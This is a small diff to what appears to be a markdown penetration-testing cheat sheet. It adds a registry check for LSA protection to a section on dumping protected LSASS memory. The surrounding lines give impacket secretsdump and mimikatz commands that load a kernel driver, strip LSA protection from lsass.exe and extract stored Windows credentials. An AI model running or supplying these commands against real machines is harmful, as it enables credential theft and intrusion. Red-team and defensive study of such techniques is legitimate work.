@@ -742,6 +742,7 @@ Right after you perform these steps, you will get an error that you can no longe
 `python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam -system /tmp/system LOCAL`
 
 - **Protected LSASS dump**
+`reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa` Check if = 0x1
 `mimikatz # privilege::debug`
 `mimikatz # !+`*Loading the mimidrv Driver into Memory*
 `!processprotect /process:lsass.exe /remove`*Removing the LSA Protection*
